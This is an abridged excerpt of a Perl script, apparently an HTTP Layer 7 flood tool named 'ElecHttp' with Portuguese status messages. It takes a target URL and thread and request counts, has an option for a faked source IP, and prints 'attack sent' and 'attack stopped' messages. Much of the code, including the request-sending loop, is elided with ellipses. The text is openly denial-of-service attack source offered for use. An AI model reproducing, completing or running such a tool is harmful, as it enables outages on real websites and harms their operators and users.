...
sub sender {
    ...
    while(true) {
        ...
        unless($sock) {
            print "\n[-] Droping - > ElecHttp Layer7 Method\n\n";
            sleep(1);
            next;
        }
...
sub layer7 {
    ...
    if($url !~ /^http:\/\//) {
        die("[-] ElectHttp - > Por favor, corriga o URL\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $peerto = 80;
    ...
    $file =~ s/\s/ /g;
    print join "","ElectHttp - > Ataque enviado.";
    $file = "/".$file if($file !~ /^\//);
    print join "","";
    if($ipfake eq "") {
    ...
    print "[+] ElecHttp - > Ataque enviado com sucesso.\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(7);
            $v--;
    ...
    print "[+] ElecHttp - > Ataque parado.\n";
}

if($#ARGV > 2) {
    layer7();
} else {
    die("Comando: ElecHttp.pl (url) 10000 50 100\n");
}